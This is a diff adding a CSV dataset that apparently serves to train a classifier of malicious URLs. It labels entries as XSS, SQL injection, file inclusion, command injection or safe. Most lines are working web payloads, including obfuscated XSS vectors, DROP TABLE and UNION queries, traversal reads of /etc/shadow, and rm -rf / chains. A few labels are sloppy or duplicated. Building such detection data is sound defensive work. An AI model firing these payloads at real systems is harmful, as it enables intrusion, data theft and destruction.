@@ -1,0 +1,154 @@
+urls,label
+http://example.com/search?q=<script>alert('XSS')</script>,XSS
+http://example.com/view.php?id=<img src='x' onerror='alert(1)'>,XSS
+http://vulnerable-site.com/login?username=<script>alert('hack')</script>&xsspassword=1234,XSS
+http://example.com/?name=<svg/onload=alert('XSS')>,XSS
+http://example.com/comment?text=<iframe src="javascript:alert('XSS')"></iframe>,XSS
+http://example.com/product?id=1' OR '1'='1,SQLI
+http://example.com/login?username=admin'--&password=password,SQLI
+http://example.com/search?q='; DROP TABLE users; --,SQLI
+http://example.com/article?id=10;SELECT * FROM users WHERE '1'='1,SQLI
+http://example.com/products.php?category=electronics%20OR%201=1,SQLI
+http://example.com/index.php?page=../../../../etc/passwd,LFI
+http://example.com/download.php?file=../../config.php,LFI
+http://vulnerable-site.com/page?file=../../../../../windows/system32/drivers/etc/hosts,LFI
+http://example.com/template.php?path=../../../../../../var/log/auth.log,LFI
+http://example.com/view?doc=../../../../../etc/shadow,LFI
+http://example.com/exec?cmd=ls,CommandI
+http://example.com/ping?host=google.com;cat%20/etc/passwd,CommandI
+http://vulnerable-site.com/?cmd=ping%20127.0.0.1;rm%20-rf%20/,CommandI
+http://example.com/shell?command=whoami;uname -a,CommandI
+http://example.com/exec?input=ping -c 4 google.com; cat /etc/passwd,CommandI
+http://example.com/home,SEGURO
+http://example.com/search?q=product,SEGURO
+http://example.com/contact,SEGURO
+http://secure-website.com/about,SEGURO
+http://secure-website.com/products?id=25,SEGURO
+http://example.com/article?id=10,SEGURO
+http://trusted-site.com/blog?post=5,SEGURO
+http://example.com/login?username=user&password=securepass123,SEGURO
+http://example.com/shop/category/electronics,SEGURO
+http://trusted-site.com/services/contact,SEGURO
+http://example.com/admin?user=<script>alert('1')</script>,XSS
+http://testsite.com/forum?comment=<img src="x" onerror="alert(2)">,XSS
+http://example.com/shop?item=<svg/onload=alert('XSS')>,XSS
+http://example.com/search?q=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E,XSS
+http://vulnerable.com/profile.php?user=<img src=x onerror=alert(3)>,XSS
+http://example.com/post?id=1'; DROP TABLE comments; --,SQLI
+http://vulnerable-site.com/search?term='; DELETE FROM users; --,SQLI
+http://example.com/login?username=admin' AND 1=1--&password=pass123,SQLI
+http://example.com/view.php?id=5 OR 1=1,SQLI
+http://testsite.com/index?id=1 UNION SELECT * FROM users,SQLI
+http://example.com/index.php?file=../../../../etc/hosts,LFI
+http://example.com/download.php?path=../../../../../../etc/passwd,LFI
+http://vulnerable.com/show.php?file=.t.ini,LFI
+http://example.com/serve.php?doc=../../../../../../usr/local/data,LFI
+http://example.com/open.php?file=../../../../etc/group,LFI
+http://example.com/cmd?exec=cat%20/etc/shadow,CommandI
+http://example.com/ping?ip=127.0.0.1;cat%20/etc/passwd,CommandI
+http://example.com/execute?command=ping -c 4 localhost,CommandI
+http://vulnerable.com/command?run=ls -al /,CommandI
+http://example.com/run?exec=rm -rf /home/user/,CommandI
+http://secure-site.com/aboutus,SEGURO
+http://trusted-site.com/products/item?id=10,SEGURO
+http://example.com/login,SEGURO
+http://secure.com/support,SEGURO
+http://example.com/view?id=15&lang=en,SEGURO
+http://safe-site.com/download?file=document.pdf,SEGURO
+http://example.com/services?category=design,SEGURO
+http://trusted.com/shop?item=laptop,SEGURO
+http://example.com/profile?user=12345,SEGURO
+http://trusted.com/checkout?orderid=98765,SEGURO
+http://testsite.com/?search=<script>alert('XSS Attack')</script>,XSS
+http://example.com/comment?message=<svg/onload=alert('Hacked')>,XSS
+http://example.com/profile.php?user=<iframe src="javascript:alert('XSS')"></iframe>,XSS
+http://vulnerable.com/view?id=<img src='x' onerror='alert(0)'>,XSS
+http://example.com/login?redirect=<script>alert(document.cookie)</script>,XSS
+http://example.com/login?username=admin' OR '1'='1,SQLI
+http://malicious-site.com/search?q=' OR '1'='1,SQLI
+http://example.com/report?filter=' OR 'x'='x',SQLI
+http://example.com/login.php?user=admin'--,SQLI
+http://example.com/serve.php?file=../../../../windows/system32/drivers/etc/hosts,LFI
+http://vulnerable.com/download.php?file=../../../../../../etc/shadow,LFI
+http://example.com/page?doc=../../../../../etc/passwd,LFI
+http://example.com/open?document=../../../../../../../var/log/auth.log,LFI
+http://vulnerable-site.com/view?path=../../../../../../boot.ini,LFI
+http://example.com/command?cmd=lsCommandI,CommandI
+http://example.com/ping?host=127.0.0.1;cat /etc/shadow,CommandI
+http://malicious-site.com/run?cmd=whoami;rm -rf /,CommandI
+http://example.com/admin?cmd=cat%20/etc/passwd,CommandI
+http://vulnerable.com/shell?exec=ping 8.8.8.8; rm -rf /,CommandI
+http://secure-site.com/homepage,SEGURO
+http://example.com/search?query=phone,SEGURO
+http://trusted-site.com/about-us,SEGURO
+http://example.com/shop/item?id=45,SEGURO
+http://secure-site.com/product?id=32,SEGURO
+http://example.com/blog/article?id=100,SEGURO
+http://safe-site.com/login?user=user&pass=pass123,SEGURO
+http://trusted-site.com/product/list,SEGURO
+http://example.com/help/contact-us,SEGURO
+http://safe-site.com/item/view?id=85,SEGURO
+http://trusted-site.com/profile?id=customer123,SEGURO
+google.com,SEGURO
+x.com,SEGURO
+https://x.com,SEGURO
+<AuDiO/**/oNLoaDStaRt='(_=/**/confirm/**/(1))'/src><!--x,XSS
+<mArquee onStart=[~[onmouseleave(([[(alert(1))]]))]] ],XSS
+<img src="/" =_=" title="onerror='/**/prompt(1)'">,XSS
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z,XSS
+<a/onmousemove=alert(1)//>xss,XSS
+<object allowscriptaccess=always><param name=code value=https://l0.cm/xss.swf>,XSS
+<svg+onload=eval(location.hash.substr(1))>#alert(1),XSS
+<details/open/ontoggle=confirm('XSS')>,XSS
+</script><svg><script>alert(1)/&apos;,XSS
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//,XSS
+<svg 1=""onload=alert(1)>,XSS
+https://google.com,SEGURO
+admin' OR '1'='1,SQLI
+' OR '1'='1,SQLI
+' OR 'x'='x',SQLI
+http://facebook.com././././</script>?pred=' OR 'x'='x',SQLI
+admin'--&password=password,SQLI
+' OR 1=1--,SQLI
+'OR '' = ',SQLI
+' union select 1,SQLI
+1--'OR 1=1--,SQLI
+' OR '1'='1,SQLI
+' OR 'x'='x',SQLI
+http://facebook.com././././</script>?pred=' OR 'x'='x',SQLI
+admin'--&password=password,SQLI
+' OR 1=1--,SQLI
+'OR '' = ',SQLI
+' union select 1,SQLI
+1--'OR 1=1--,SQLI
+http://example.com/?id=1,SEGURO
+SELECT * FROM users WHERE id=1,SEGURO
+https://www.instagram.com/Serome111,SEGURO
+https://www.instagram.com/stories/dragon.jar/,SEGURO
+https://x.com/elonmusk/status/1839439841337225277,SEGURO
+https://youtube.com,SEGURO
+https://www.youtube.com/channel/UCi3zcSdo3mh5qY0roVRDJBA,SEGURO
+https://cloud.digitalocean.com/account/profile?i=09861,SEGURO
+../../../../../../etc/passwd,LFI
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,LFI
+../../../../../../var/log/auth.log,LFI
+UNION SELECT username,SQLI
+' OR '1'='1,SQLI
+admin'--,SQLI
+1=1,SQLI
+' OR 'a'='a,SQLI
+../../../boot.ini,LFI
+../../../../etc/shadow,LFI
+' OR 'x'='x'/*,SQLI
+' OR 'x'='x'#,SQLI
+' OR 1=1 -- ,SQLI
+%27%20OR%20%271%27%3D%271,SQLI
+%3Cscript%3Ealert(1)%3C%2Fscript%3E,XSS
+<img src=x onerror=alert(1)>,XSS
+javascript:alert(1),XSS
+' UNION SELECT null version()-- ,SQLI
+' UNION SELECT username password FROM mysql.user-- ,SQLI
+../../../../../../proc/self/environ,LFI
+../../../../../../proc/self/status,LFI
+' OR 1=1 LIMIT 1 -- ,SQLI
+' UNION ALL SELECT null,null,@@version,SQLI
